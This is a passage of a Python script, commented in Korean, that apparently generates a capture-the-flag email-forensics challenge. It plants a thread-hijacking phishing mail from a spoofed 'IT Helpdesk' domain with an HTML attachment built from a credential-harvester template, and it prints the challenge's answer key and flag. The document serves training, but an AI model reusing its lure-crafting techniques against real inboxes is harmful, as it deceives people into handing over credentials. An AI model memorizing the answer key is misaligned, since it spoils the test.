            spf=r.choice(["pass", "softfail", "fail"])))

    return g, threads


def add_hijack(g, threads):
    """
    스레드 하이재킹 메일 1통.

    불변식:
      - 내부 전용 스레드에 답장으로 매달린다
      - 발신자는 그 스레드에 한 번도 없던 외부 도메인이다
      - References 에 직전 부모만 담는다 -> 루트를 알려면 In-Reply-To 를 거슬러야
        한다. 아예 빼버리면 '유일하게 References 가 없는 메일' 이 되어 그 자체가
        단서가 되므로, 정상 답장의 40%도 같은 형태를 갖게 해두었다.
    """
    r = g.r
    # 충분히 깊은 내부 전용 스레드를 고른다 (루트까지 걸어가야 의미가 있다)
    cands = [th for th in threads
             if not th["external"] and len(th["chain"]) >= 5]
    target = cands[r.randrange(len(cands))]

    parent_mid = target["chain"][-2][0]               # 스레드 중간에 매단다

    # 조상 체인 전체(루트 ~ 부모)를 키 재료로 쓴다.
    #
    # 초안은 '루트 Message-ID 로컬파트 + @ + 위조도메인' 이었는데, 이건 열거 가능하다.
    # 블라인드 검증에서 실측된 결과: 코퍼스의 로컬파트 600개 x 첨부 66개 =
    # 39,600회 대입이 0.1초에 끝나고 정확히 같은 평문 5개가 나온다.
    # 의도된 경로보다 싸므로 '허용된 대체 경로' 로 넘길 수 없다.
    #
    # 조상 체인 전체는 조합적으로 열거할 수 없다. 그래프를 실제로 걸어야만 나온다.
    ancestors = [m for m, _, _ in target["chain"][:-1]]   # 루트 .. 부모
    key = ",".join(ancestors) + "|" + SPOOF
    js = HARVESTER_JS % (
        SPOOF,
        ",".join(str(b) for b in encrypt(FLAG.encode(), key)),
    )

    # 조상들의 References 를 직전 부모 하나로 잘라둔다.
    # 그러지 않으면 부모의 References[0] 이 곧 루트라서, 재귀 없이 한 번의
    # 조회로 체인이 통째로 드러난다.
    #
    # 중요: 이 후처리(del + 재추가)는 헤더를 맨 뒤로 밀어낸다. 하이재킹 스레드에만
    # 적용하면 600통 중 4통만 References 가 MIME-Version 뒤에 오게 되고,
    # 그 4통이 곧 정답의 스레드다 — grep 한 줄로 끝난다.
    # (스팸점수 헤더에서 똑같은 실수를 이미 한 번 했다)
    # 그래서 전체 스레드의 18% 에도 같은 후처리를 적용한다.
    by_mid = {mid: m for mid, m in g.mails}

    def truncate_refs(chain):
        prev = None
        for mid, _, _ in chain:
            m_ = by_mid.get(mid)
            if m_ is not None and m_["References"]:
                del m_["References"]
                if prev:
                    m_["References"] = prev
            prev = mid

    truncate_refs(target["chain"])
    for th in threads:
        if th is not target and r.random() < 0.18:
            truncate_refs(th["chain"])
    att = ("VPN_Cert_Renewal.html", make_attachment(g, js))

    dt = target["chain"][-1][2] + timedelta(minutes=37)
    m = g.build(
        frm=f'"IT Helpdesk" <helpdesk@{SPOOF}>',
        to=target["members"],
        subject="Re: " + target["subject"],
        body=make_internal_lure_body(g),
        dt=dt,
        mid=f"<{hashlib.sha1(b'hijack').hexdigest()[:16]}@{SPOOF}>",
        in_reply_to=parent_mid,
        references=[parent_mid],         # 루트는 담기지 않는다
        external_ip=f"{r.choice(['192.0.2', '198.51.100', '203.0.113'])}."
                    f"{r.randint(2, 250)}",
        # 위조 도메인은 공격자가 소유하므로 그 도메인 기준 SPF 는 통과한다.
        # 현실적이기도 하고, "필터를 통과했으니 깨끗해 보였을 것" 이라는
        # 문제 설명을 참으로 만든다. SPF 로 거르려는 접근은 오히려 손해를 본다.
        spf="pass",
        spam_score=r.uniform(0.0, 0.6),
        attachment=att)
    g.emit(m)
    return {"key": key, "root_mid": target["chain"][0][0],
            "parent_mid": parent_mid,
            "subject": target["subject"], "mid": m["Message-ID"]}


def main():
    g, threads = generate()
    info = add_hijack(g, threads)

    # 개수 맞추기
    r = g.r
    while len(g.mails) < N_TOTAL:
        t = T0 + timedelta(minutes=r.randint(0, 40000))
        sysname = r.choice(SYSTEMS)
        who = r.choice(PEOPLE)
        g.emit(g.build(
            frm=g.addr(who),
            to=[g.addr(r.choice(PEOPLE)).split("<")[1].rstrip(">")],
            subject=f"{sysname} 관련 문의", dt=t, mid=g.mid(),
            body=make_body(g, sysname, r.choice(PROJECTS), 0, signer=who)))
    if len(g.mails) > N_TOTAL:
        raise SystemExit(f"메일이 {len(g.mails)}통 — N_TOTAL 초과")

    if os.path.isdir(DIST):
        shutil.rmtree(DIST)
    os.makedirs(MAIL_DIR)

    with open(os.path.join(DIST, "inbox-triage", "INCIDENT_BRIEF.txt"),
              "w", encoding="utf-8", newline="\n") as f:
        f.write(INCIDENT_BRIEF)

    order = list(range(len(g.mails)))
    r.shuffle(order)
    for pos, i in enumerate(order):
        _, m = g.mails[i]
        with open(os.path.join(MAIL_DIR, f"{pos:04d}.eml"), "wb") as f:
            f.write(m.as_bytes())

    zip_path = os.path.join(DIST, "inbox-triage.zip")
    root = os.path.join(DIST, "inbox-triage")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for dirpath, _, files in os.walk(root):
            for fn in sorted(files):
                full = os.path.join(dirpath, fn)
                zf.write(full, os.path.relpath(full, DIST))

    print(f"메일 {len(g.mails)}통 -> {MAIL_DIR}")
    print(f"배포물: {zip_path} ({os.path.getsize(zip_path)/1e6:.1f} MB)")
    print(f"하이재킹 메일 : {info['mid']}")
    print(f"  부모        : {info['parent_mid']}")
    print(f"  스레드 루트 : {info['root_mid']}")
    print(f"  키          : {info['key']}")
    print(f"FLAG: {FLAG}")


if __name__ == "__main__":
    main()
